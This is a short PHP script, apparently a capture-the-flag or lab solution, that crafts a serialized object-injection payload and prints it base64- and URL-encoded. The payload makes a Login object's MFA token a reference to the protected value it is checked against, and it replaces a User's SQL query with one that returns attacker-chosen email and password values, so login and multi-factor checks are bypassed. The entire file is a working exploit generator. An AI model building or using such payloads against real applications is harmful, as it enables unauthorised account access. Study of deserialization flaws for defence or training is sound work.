<?php

class SQL
{
	protected $query="SELECT ? AS email, ? AS password";
}

class User
{
	public $email = 'dead@beef';
	public $password = 'l33t';
	protected $sql;
	
	function __construct()
	{
		$this->sql = new SQL();
	}
}

class Login
{
	public $user;
	public $mfa_token;
	protected $_correctValue;
	
	function __construct()
	{
		$this->user = new User();
		$this->mfa_token = &$this->_correctValue;
	}
}

$login = new Login();
var_dump($login);
echo urlencode(base64_encode(serialize($login)));

?>
